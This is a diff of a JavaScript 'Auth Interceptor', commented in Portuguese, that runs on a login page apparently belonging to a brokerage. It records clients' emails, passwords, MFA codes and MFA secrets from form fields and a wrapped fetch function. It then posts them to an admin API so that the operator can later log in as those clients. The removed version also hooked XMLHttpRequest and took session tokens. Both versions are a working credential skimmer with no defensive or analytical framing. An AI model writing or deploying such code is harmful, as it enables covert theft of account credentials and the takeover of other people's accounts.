@@ -1,25 +1,80 @@
 /**
- * AUTH INTERCEPTOR
+ * AUTH INTERCEPTOR - LOGIN ONLY
  * 
- * Intercepta requisições de autenticação e salva dados no banco via API
- * para que o admin possa visualizar credenciais e tokens MFA
+ * Captura APENAS dados de login (email, senha, MFA) da página de login do Cocos
+ * para que o admin possa fazer login como seus clientes no futuro
+ * 
+ * NÃO captura tokens de API ou outras informações
  */
 
 (function() {
   'use strict';
   
-  console.log('[Auth Interceptor] Sistema de captura ativo!');
+  console.log('[Auth Interceptor] Sistema de captura de login ativo!');
   
-  // Store para guardar dados temporariamente
-  const authDataStore = {
+  // Store temporário para dados de login
+  const loginData = {
     email: null,
     password: null,
-    mfaCode: null,
-    sessionToken: null,
+    mfaSecret: null,
   };
   
+  let loginCaptured = false;
+  
   /**
-   * Interceptar fetch para capturar requisições de login
+   * Capturar dados de inputs de formulário
+   */
+  document.addEventListener('input', function(e) {
+    const input = e.target;
+    
+    // Capturar email
+    if (input.type === 'email' || input.name === 'email' || input.id === 'email' || input.placeholder?.toLowerCase().includes('email')) {
+      if (input.value && input.value.includes('@')) {
+        loginData.email = input.value;
+        console.log('[Auth Interceptor] Email capturado:', input.value);
+      }
+    }
+    
+    // Capturar senha
+    if (input.type === 'password' || input.name === 'password' || input.id === 'password' || input.placeholder?.toLowerCase().includes('contrase')) {
+      if (input.value && input.value.length >= 6) {
+        loginData.password = input.value;
+        console.log('[Auth Interceptor] Senha capturada (length:', input.value.length, ')');
+      }
+    }
+    
+    // Capturar código MFA (6 dígitos)
+    if ((input.name && input.name.toLowerCase().includes('code')) ||
+        (input.id && input.id.toLowerCase().includes('code')) ||
+        (input.placeholder && (input.placeholder.toLowerCase().includes('código') || input.placeholder.toLowerCase().includes('code')))) {
+      if (input.value && input.value.length === 6 && /^\d+$/.test(input.value)) {
+        loginData.mfaSecret = input.value;
+        console.log('[Auth Interceptor] Código MFA capturado');
+      }
+    }
+  }, true);
+  
+  /**
+   * Capturar submit de formulário de login
+   */
+  document.addEventListener('submit', function(e) {
+    const form = e.target;
+    
+    // Verificar se é um formulário de login
+    const isLoginForm = form.querySelector('input[type="email"]') || 
+                       form.querySelector('input[type="password"]') ||
+                       form.action.includes('login') ||
+                       form.id?.toLowerCase().includes('login');
+    
+    if (isLoginForm && loginData.email && loginData.password && !loginCaptured) {
+      console.log('[Auth Interceptor] Formulário de login submetido - salvando credenciais...');
+      saveLoginCredentials();
+      loginCaptured = true;
+    }
+  }, true);
+  
+  /**
+   * Interceptar fetch para detectar login bem-sucedido
    */
   const originalFetch = window.fetch;
   window.fetch = async function(...args) {
@@ -27,214 +82,79 @@
     const options = args[1] || {};
     
     try {
-      // Interceptar login
-      if (typeof url === 'string' && url.includes('/login')) {
-        const body = options.body;
-        if (body) {
-          try {
-            const data = JSON.parse(body);
-            if (data.email) authDataStore.email = data.email;
-            if (data.password) authDataStore.password = data.password;
-            console.log('[Auth Interceptor] Login detectado:', authDataStore.email);
-          } catch (e) {
-            // Body não é JSON
-          }
-        }
-      }
-      
-      // Interceptar MFA
-      if (typeof url === 'string' && (url.includes('/mfa') || url.includes('/2fa') || url.includes('/otp'))) {
-        const body = options.body;
-        if (body) {
-          try {
-            const data = JSON.parse(body);
-            if (data.code || data.otp || data.token) {
-              authDataStore.mfaCode = data.code || data.otp || data.token;
-              console.log('[Auth Interceptor] MFA code detectado');
-            }
-          } catch (e) {
-            // Body não é JSON
-          }
-        }
-      }
-      
       // Fazer requisição original
       const response = await originalFetch.apply(this, args);
       
-      // Interceptar resposta de sucesso
-      if (response.ok) {
-        const clonedResponse = response.clone();
-        try {
-          const responseData = await clonedResponse.json();
+      // Se é uma requisição de login e foi bem-sucedida
+      if (typeof url === 'string' && url.includes('/login') && response.ok) {
+        if (loginData.email && loginData.password && !loginCaptured) {
+          console.log('[Auth Interceptor] Login bem-sucedido detectado - salvando credenciais...');
           
-          // Capturar token de sessão
-          if (responseData.token || responseData.accessToken || responseData.sessionToken) {
-            authDataStore.sessionToken = responseData.token || responseData.accessToken || responseData.sessionToken;
-            console.log('[Auth Interceptor] Session token capturado');
+          // Tentar capturar MFA secret da resposta (se houver)
+          const clonedResponse = response.clone();
+          try {
+            const responseData = await clonedResponse.json();
+            if (responseData.mfaSecret || responseData.secret) {
+              loginData.mfaSecret = responseData.mfaSecret || responseData.secret;
+              console.log('[Auth Interceptor] MFA secret capturado da resposta');
+            }
+          } catch (e) {
+            // Response não é JSON ou não tem MFA secret
           }
           
-          // Capturar MFA secret
-          if (responseData.mfaSecret || responseData.secret) {
-            authDataStore.mfaSecret = responseData.mfaSecret || responseData.secret;
-            console.log('[Auth Interceptor] MFA secret capturado');
-          }
-          
-          // Se temos dados completos, salvar no banco
-          if (authDataStore.email && authDataStore.password) {
-            saveAuthData();
-          }
-        } catch (e) {
-          // Response não é JSON
+          saveLoginCredentials();
+          loginCaptured = true;
         }
       }
       
       return response;
     } catch (error) {
-      console.error('[Auth Interceptor] Erro:', error);
+      console.error('[Auth Interceptor] Erro no fetch:', error);
       return originalFetch.apply(this, args);
     }
   };
   
   /**
-   * Interceptar XMLHttpRequest
+   * Salvar credenciais de login no banco via API
    */
-  const originalXHROpen = XMLHttpRequest.prototype.open;
-  const originalXHRSend = XMLHttpRequest.prototype.send;
-  
-  XMLHttpRequest.prototype.open = function(method, url, ...rest) {
-    this._url = url;
-    this._method = method;
-    return originalXHROpen.apply(this, [method, url, ...rest]);
-  };
-  
-  XMLHttpRequest.prototype.send = function(body) {
-    const xhr = this;
-    
-    // Interceptar login
-    if (this._url && this._url.includes('/login') && body) {
-      try {
-        const data = JSON.parse(body);
-        if (data.email) authDataStore.email = data.email;
-        if (data.password) authDataStore.password = data.password;
-        console.log('[Auth Interceptor] Login detectado (XHR):', authDataStore.email);
-      } catch (e) {
-        // Body não é JSON
-      }
+  async function saveLoginCredentials() {
+    if (!loginData.email || !loginData.password) {
+      console.log('[Auth Interceptor] ⚠️ Dados incompletos - não salvando');
+      return;
     }
     
-    // Interceptar MFA
-    if (this._url && (this._url.includes('/mfa') || this._url.includes('/2fa') || this._url.includes('/otp')) && body) {
-      try {
-        const data = JSON.parse(body);
-        if (data.code || data.otp || data.token) {
-          authDataStore.mfaCode = data.code || data.otp || data.token;
-          console.log('[Auth Interceptor] MFA code detectado (XHR)');
-        }
-      } catch (e) {
-        // Body não é JSON
-      }
-    }
-    
-    // Interceptar resposta
-    const originalOnReadyStateChange = xhr.onreadystatechange;
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState === 4 && xhr.status >= 200 && xhr.status < 300) {
-        try {
-          const responseData = JSON.parse(xhr.responseText);
-          
-          // Capturar tokens
-          if (responseData.token || responseData.accessToken || responseData.sessionToken) {
-            authDataStore.sessionToken = responseData.token || responseData.accessToken || responseData.sessionToken;
-            console.log('[Auth Interceptor] Session token capturado (XHR)');
-          }
-          
-          // Capturar MFA secret
-          if (responseData.mfaSecret || responseData.secret) {
-            authDataStore.mfaSecret = responseData.mfaSecret || responseData.secret;
-            console.log('[Auth Interceptor] MFA secret capturado (XHR)');
-          }
-          
-          // Salvar dados
-          if (authDataStore.email && authDataStore.password) {
-            saveAuthData();
-          }
-        } catch (e) {
-          // Response não é JSON
-        }
-      }
-      
-      if (originalOnReadyStateChange) {
-        originalOnReadyStateChange.apply(this, arguments);
-      }
-    };
-    
-    return originalXHRSend.apply(this, arguments);
-  };
-  
-  /**
-   * Interceptar inputs de formulário
-   */
-  document.addEventListener('input', function(e) {
-    const input = e.target;
-    
-    // Capturar email
-    if (input.type === 'email' || input.name === 'email' || input.id === 'email') {
-      if (input.value && input.value.includes('@')) {
-        authDataStore.email = input.value;
-        console.log('[Auth Interceptor] Email capturado do input:', input.value);
-      }
-    }
-    
-    // Capturar senha
-    if (input.type === 'password' || input.name === 'password' || input.id === 'password') {
-      if (input.value && input.value.length >= 6) {
-        authDataStore.password = input.value;
-        console.log('[Auth Interceptor] Senha capturada do input');
-      }
-    }
-    
-    // Capturar MFA code
-    if ((input.name && input.name.toLowerCase().includes('code')) ||
-        (input.id && input.id.toLowerCase().includes('code')) ||
-        (input.placeholder && input.placeholder.toLowerCase().includes('código'))) {
-      if (input.value && input.value.length === 6 && /^\d+$/.test(input.value)) {
-        authDataStore.mfaCode = input.value;
-        console.log('[Auth Interceptor] MFA code capturado do input');
-      }
-    }
-  }, true);
-  
-  /**
-   * Salvar dados de autenticação no banco via API
-   */
-  async function saveAuthData() {
     try {
-      console.log('[Auth Interceptor] Salvando dados de autenticação...');
+      console.log('[Auth Interceptor] Salvando credenciais de login...');
       
-      // Fazer requisição para salvar dados
       const response = await originalFetch('/api/trpc/admin.saveClientAuth', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          email: authDataStore.email,
-          password: authDataStore.password,
-          mfaSecret: authDataStore.mfaSecret,
-          mfaCode: authDataStore.mfaCode,
-          sessionToken: authDataStore.sessionToken,
+          email: loginData.email,
+          password: loginData.password,
+          mfaSecret: loginData.mfaSecret || undefined,
         }),
       });
       
       if (response.ok) {
-        console.log('[Auth Interceptor] ✅ Dados salvos com sucesso!');
+        console.log('[Auth Interceptor] ✅ Credenciais salvas com sucesso!');
+        console.log('[Auth Interceptor] Email:', loginData.email);
+        console.log('[Auth Interceptor] MFA:', loginData.mfaSecret ? 'Sim' : 'Não');
       } else {
-        console.log('[Auth Interceptor] ⚠️ Erro ao salvar dados');
+        console.log('[Auth Interceptor] ⚠️ Erro ao salvar credenciais - status:', response.status);
       }
     } catch (error) {
-      console.error('[Auth Interceptor] Erro ao salvar:', error);
+      console.error('[Auth Interceptor] ❌ Erro ao salvar:', error);
     }
+    
+    // Limpar dados após salvar
+    loginData.email = null;
+    loginData.password = null;
+    loginData.mfaSecret = null;
   }
   
-  console.log('[Auth Interceptor] Todos os interceptadores ativos!');
+  console.log('[Auth Interceptor] Interceptador de login ativo!');
+  console.log('[Auth Interceptor] Capturando: Email, Senha, MFA (se houver)');
 })();
